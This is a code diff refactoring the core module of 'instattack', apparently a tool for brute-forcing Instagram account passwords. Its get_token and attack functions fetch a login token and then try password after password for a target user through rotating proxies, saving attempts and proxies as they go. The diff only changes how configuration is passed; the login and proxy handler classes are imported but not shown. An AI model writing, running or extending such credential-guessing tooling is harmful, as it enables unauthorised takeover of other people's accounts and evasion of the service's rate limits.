@@ -1,57 +1,56 @@
 import asyncio
 
 from instattack.logger import AppLogger
-from instattack.exceptions import TokenNotFound
 
-from .handlers import ProxyHandler, TokenHandler, PasswordHandler
+from .tokens.exceptions import TokenNotFound
+from .tokens import TokenHandler
+from .login import LoginHandler
+from .proxies import ProxyHandler
 
 
-def get_handlers(request_config=None, broker_config=None, pool_config=None):
+def get_handlers(config):
 
     lock = asyncio.Lock()
     start_event = asyncio.Event()
 
     proxy_handler = ProxyHandler(
+        config,
         method='GET',
         lock=lock,
         start_event=start_event,
-        broker_config=broker_config,
-        pool_config=pool_config,
     )
     token_handler = TokenHandler(
+        config,
         proxy_handler,
         start_event=start_event,
-        **request_config
     )
     return proxy_handler, token_handler
 
 
-def post_handlers(user, request_config=None, broker_config=None, pool_config=None,
-        pwlimit=None):
+def post_handlers(user, config):
 
     lock = asyncio.Lock()
     start_event = asyncio.Event()
     auth_result_found = asyncio.Event()
 
     proxy_handler = ProxyHandler(
+        config,
         method='POST',
         lock=lock,
         start_event=start_event,
-        broker_config=broker_config,
-        pool_config=pool_config,
     )
-    password_handler = PasswordHandler(
+
+    password_handler = LoginHandler(
+        config,
         proxy_handler,
         user=user,
         start_event=start_event,
         stop_event=auth_result_found,
-        limit=pwlimit,
-        **request_config,
     )
     return proxy_handler, password_handler
 
 
-async def get_token(loop, request_config=None, broker_config=None, pool_config=None):
+async def get_token(loop, config):
     """
     Uses proxies specifically for GET requests to synchronously make
     requests to the INSTAGRAM_URL until a valid response is received with
@@ -65,11 +64,7 @@ async def get_token(loop, request_config=None, broker_config=None, pool_config=N
     """
     log = AppLogger('attack:get_token')
 
-    get_proxy_handler, token_handler = get_handlers(
-        request_config=request_config,
-        broker_config=broker_config,
-        pool_config=pool_config,
-    )
+    get_proxy_handler, token_handler = get_handlers(config)
 
     try:
         results = await asyncio.gather(
@@ -79,29 +74,28 @@ async def get_token(loop, request_config=None, broker_config=None, pool_config=N
     except TokenNotFound as e:
         log.error(e)
 
-        if not get_proxy_handler._stopped:
-            await get_proxy_handler.stop(loop)
+        if not get_proxy_handler.broker._stopped:
+            get_proxy_handler.broker.stop(loop)
 
         # Do we really want to save proxies on exceptions?
-        await get_proxy_handler.save(loop)
+        await get_proxy_handler.pool.save(loop)
         return None
 
     except Exception as e:
-        if not get_proxy_handler._stopped:
-            await get_proxy_handler.stop(loop)
+        if not get_proxy_handler.broker._stopped:
+            get_proxy_handler.broker.stop(loop)
 
         # Do we really want to save proxies on exceptions?
-        await get_proxy_handler.save(loop)
+        await get_proxy_handler.pool.save(loop)
 
         loop.call_exception_handler({'exception': e})
         return None
     else:
-        await get_proxy_handler.stop(loop)
+        get_proxy_handler.broker.stop(loop)
         return results[0]
 
 
-async def attack(loop, token, user, request_config=None, pool_config=None,
-        broker_config=None, pwlimit=None):
+async def attack(loop, token, user, config):
     """
     Uses the token retrieved from the initial phase of the command to
     iteratively try each password for the given user with the provided
@@ -114,13 +108,8 @@ async def attack(loop, token, user, request_config=None, pool_config=None,
     Proxies will not be saved if it wasn't started, but that is probably
     desired behavior.
     """
-    post_proxy_handler, password_handler = post_handlers(
-        user,
-        request_config=request_config,
-        broker_config=broker_config,
-        pool_config=pool_config,
-        pwlimit=pwlimit,
-    )
+    post_proxy_handler, password_handler = post_handlers(user, config)
+
     try:
         results = await asyncio.gather(
             password_handler.run(loop, token),
@@ -128,8 +117,8 @@ async def attack(loop, token, user, request_config=None, pool_config=None,
         )
 
     except Exception as e:
-        if not post_proxy_handler._stopped:
-            await post_proxy_handler.stop(loop)
+        if not post_proxy_handler.broker._stopped:
+            post_proxy_handler.broker.stop(loop)
 
         # We might need a stop method for the password handler still just in case
         # an exception is raised.
@@ -138,13 +127,13 @@ async def attack(loop, token, user, request_config=None, pool_config=None,
         # Save Attempts Up Until This Point & Save Proxies
         # Do we really want to save proxies on exceptions?
         await password_handler.save(loop)
-        await post_proxy_handler.save(loop)
+        await post_proxy_handler.pool.save(loop)
 
         loop.call_exception_handler({'exception': e})
 
     else:
         # Proxy Handler Should be Stopped?
-        await post_proxy_handler.stop(loop)
+        post_proxy_handler.broker.stop(loop)
 
         # We might need a stop method for the password handler still just in case
         # an exception is raised.
@@ -152,6 +141,6 @@ async def attack(loop, token, user, request_config=None, pool_config=None,
 
         # Save Attempts Up Until This Point & Save Proxies
         await password_handler.save(loop)
-        await post_proxy_handler.save(loop)
+        await post_proxy_handler.pool.save(loop)
 
         return results[0]
